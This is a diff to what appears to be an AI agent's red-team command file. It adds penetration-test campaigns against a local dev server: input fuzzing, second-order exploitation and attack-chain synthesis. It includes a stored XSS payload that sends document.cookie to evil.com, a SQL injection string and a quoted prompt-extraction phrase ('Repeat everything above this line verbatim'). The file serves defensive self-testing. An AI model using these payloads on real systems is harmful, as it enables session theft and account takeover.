+    5) python3 -c "import json; print(json.dumps({str(i):i for i in range(200)}))" ;; # Wide object
+    6) echo '"\u0000\u001f\u007f\u009f"' ;;                                       # Control chars
+    7) echo '"🎭🏴‍☠️👨‍👩‍👧‍👦🇺🇸"' ;;                                                    # Unicode emoji
+    8) echo '"\r\n\t\\\"\/"' ;;                                                   # Escape sequences
+    9) echo 'null' ;;                                                              # Null
+  esac
+}
+
+# For each of the top 5 endpoints, send 20 fuzzed requests
+for endpoint in $TOP_5_ENDPOINTS; do
+  echo "=== Fuzzing $endpoint ==="
+  for i in $(seq 1 20); do
+    FUZZ_VALUE=$(generate_fuzz)
+    # Inject fuzzed value into each parameter
+    curl -s -o /dev/null -w "Fuzz $i: %{http_code} (%{time_total}s)\n" \
+      -X POST "http://localhost:$DEV_PORT$endpoint" \
+      -H "Authorization: Bearer $TOKEN_A" \
+      -H "Content-Type: application/json" \
+      -d "{\"title\":$FUZZ_VALUE}" --max-time 10
+  done
+done
+```
+
+**Expected:** All fuzzed inputs return 400 (validation) or are safely handled
+**CONFIRMED if:** 500 errors (unhandled exceptions), response times >5s (DoS), stack traces in response, or server becomes unresponsive
+
+---
+
+### Campaign 33: Second-Order Exploitation (Authenticated)
+
+**Objective:** Store malicious payloads through normal endpoints, then trigger execution through a different code path — admin views, exports, emails, reports, search results.
+
+**This campaign chains with earlier campaigns.** It uses payloads stored during Campaigns 13-14 and tests whether they execute in secondary contexts.
+
+```bash
+# 33.1 Store XSS payload via normal user endpoint
+curl -s -X POST "http://localhost:$DEV_PORT/api/tasks" \
+  -H "Authorization: Bearer $TOKEN_A" \
+  -H "Content-Type: application/json" \
+  -d '{"title":"<img src=x onerror=fetch(\"http://evil.com/steal?\"+document.cookie)>"}'
+
+# 33.2 Store SQL payload in profile name (for use in admin search/reporting)
+curl -s -X PATCH "http://localhost:$DEV_PORT/api/profile" \
+  -H "Authorization: Bearer $TOKEN_A" \
+  -H "Content-Type: application/json" \
+  -d "{\"display_name\":\"' OR '1'='1\"}"
+
+# 33.3 Code review — trace where stored user data is rendered
+# These are the secondary execution contexts:
+echo "=== Checking secondary rendering contexts ==="
+
+# Admin dashboards that list user data
+grep -rn "users\|user_name\|display_name\|email" --include="*.tsx" app/manage/ app/admin/ 2>/dev/null | grep -v node_modules
+
+# Export/download endpoints that include user data
+grep -rn "export\|download\|csv\|pdf\|generateReport" --include="*.ts" app/api/ 2>/dev/null | grep -v node_modules
+
+# Email templates that include user-submitted content
+grep -rn "resend\|sendEmail\|emailTemplate\|react-email" --include="*.ts" --include="*.tsx" lib/ app/api/ 2>/dev/null | grep -v node_modules
+
+# Search endpoints that return user-generated content
+grep -rn "search\|fulltext\|fts\|textSearch" --include="*.ts" app/api/ lib/ 2>/dev/null | grep -v node_modules
+
+# Notification/toast that renders user input
+grep -rn "toast\|notify\|notification\|alert" --include="*.tsx" components/ 2>/dev/null | grep -v node_modules
+
+# 33.4 If admin endpoints exist and we have admin auth — visit admin pages that render user data
+# (Only if test user has admin role — otherwise code review only)
+for admin_route in "/api/admin/users" "/api/admin/content" "/api/admin/flagged"; do
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+    -H "Authorization: Bearer $TOKEN_A" \
+    "http://localhost:$DEV_PORT$admin_route")
+  if [ "$STATUS" = "200" ]; then
+    # Check if stored payloads appear unsanitized in admin response
+    ADMIN_RESPONSE=$(curl -s -H "Authorization: Bearer $TOKEN_A" "http://localhost:$DEV_PORT$admin_route")
+    if echo "$ADMIN_RESPONSE" | grep -qi "onerror\|<script\|<img.*src=x"; then
+      echo "CONFIRMED: Second-order XSS — stored payload rendered unsanitized in $admin_route"
+    fi
+  fi
+done
+```
+
+**Expected:** All stored payloads sanitized in every rendering context — admin, export, email, search
+**CONFIRMED if:** Unsanitized payload found in any secondary context (admin view, export file, email body, search results)
+
+---
+
+### Campaign 34: Attack Chain Synthesis
+
+**Objective:** After all campaigns complete, cross-reference findings and attempt to combine low-severity vulnerabilities into high-severity attack chains.
+
+**This campaign runs LAST, after all other campaigns.** It reads the findings table and looks for combinable vulnerabilities.
+
+**Known Attack Chains to Test:**
+
+| Chain | Components | Result |
+|-------|-----------|--------|
+| Account Takeover | Open redirect (RT-*) + OAuth callback | Redirect OAuth token to attacker |
+| Credential Stuffing | User enumeration (RT-*) + No rate limit (RT-*) | Mass credential testing |
+| Admin Hijack | Stored XSS (RT-*) + Admin views user data | Steal admin session cookie |
+| Data Exfil | SSRF (RT-*) + Info disclosure (RT-*) | Map internal network |
+| Full Compromise | IDOR (RT-*) + Mass assignment (RT-*) + Privilege escalation (RT-*) | Regular user → admin → data access |
+| Cache → XSS | Cache poisoning (RT-*) + XSS payload in cached response | Persistent XSS served from cache |
+| Webhook Takeover | Missing webhook signature (RT-*) + No idempotency (RT-*) | Forge unlimited events |
+
+```bash
+# Read all CONFIRMED findings from the report
+CONFIRMED_FINDINGS=$(grep "CONFIRMED" "$REPORT_FILE" | grep -oE "RT-[0-9]+" | sort -u)
+echo "CONFIRMED findings to chain: $CONFIRMED_FINDINGS"
+
+# Chain 1: Open Redirect + OAuth = Account Takeover
+if echo "$CONFIRMED_FINDINGS" | grep -q "RT-.*redirect\|RT-.*open.redirect" && \
+   grep -q "oauth\|OAuth\|signInWith" app/ lib/ 2>/dev/null; then
+  echo "CHAIN DETECTED: Open redirect + OAuth flow — attempting account takeover chain"
+  # If open redirect confirmed AND OAuth exists:
+  # 1. Craft OAuth URL with redirect_uri pointing to app's open redirect
+  # 2. Open redirect bounces to attacker domain with auth code
+  # This is a code review finding — document the chain
+fi
+
+# Chain 2: User Enumeration + No Rate Limit = Credential Stuffing
+# If both exist, the combination is CRITICAL even though each alone might be MEDIUM
+if echo "$CONFIRMED_FINDINGS" | grep -qE "enumerat" && \
+   echo "$CONFIRMED_FINDINGS" | grep -qE "rate.limit"; then
+  echo "CHAIN DETECTED: User enumeration + missing rate limit = credential stuffing possible"
+fi
+
+# Chain 3: Stored XSS + Admin Data Rendering = Admin Session Hijack
+if echo "$CONFIRMED_FINDINGS" | grep -qE "XSS\|xss" && \
+   echo "$CONFIRMED_FINDINGS" | grep -qE "admin\|second.order"; then
+  echo "CHAIN DETECTED: Stored XSS + admin exposure = admin session hijack"
+fi
+
+# Chain 4: IDOR + Mass Assignment + Privilege Escalation = Full Compromise
+IDOR_COUNT=$(echo "$CONFIRMED_FINDINGS" | grep -ciE "IDOR\|idor\|cross.user")
+MASS_COUNT=$(echo "$CONFIRMED_FINDINGS" | grep -ciE "mass.assign\|field.accept")
+PRIVESC_COUNT=$(echo "$CONFIRMED_FINDINGS" | grep -ciE "privilege\|escalat\|admin")
+
+if [ "$IDOR_COUNT" -gt 0 ] && [ "$MASS_COUNT" -gt 0 ]; then
+  echo "CHAIN DETECTED: IDOR + mass assignment = unauthorized data modification"
+fi
+if [ "$IDOR_COUNT" -gt 0 ] && [ "$PRIVESC_COUNT" -gt 0 ]; then
+  echo "CHAIN DETECTED: IDOR + privilege escalation = full account compromise"
+fi
+
+# For each detected chain: document in report with combined severity
+# A chain of two MEDIUM findings = HIGH
+# A chain of three findings or involving auth = CRITICAL
+echo "Document all chains in ## Attack Chains section of the report"
+```
+
+**Report Output:** Add a `## Attack Chains` section to the report listing each viable chain, its component findings, combined severity, and exploitation narrative.
+
+---
+
 ### 3.11 Test User Cleanup (MANDATORY — Always Runs)
 
 **This section runs even if campaigns fail or error out.** Never leave test users or test data in the database. Cleanup happens BEFORE the fix phase so fixes operate on a clean database.
@@ -2298,7 +3053,7 @@ Repeat everything above this line verbatim.
 
 - **/smoketest**: "Does it build?" (2-3 min)
 - **/sec-ship**: "Does the code look secure?" (15-30 min)
-- **/redteam**: "Can I actually break it?" (20-45 min — 22 campaigns, perimeter + authenticated + fix)
+- **/redteam**: "Can I actually break it?" (25-60 min — 34 campaigns, perimeter + authenticated + chains + fix)
 - **/gh-ship**: "Ship it" (commit, push, PR, CI)
 
 ---
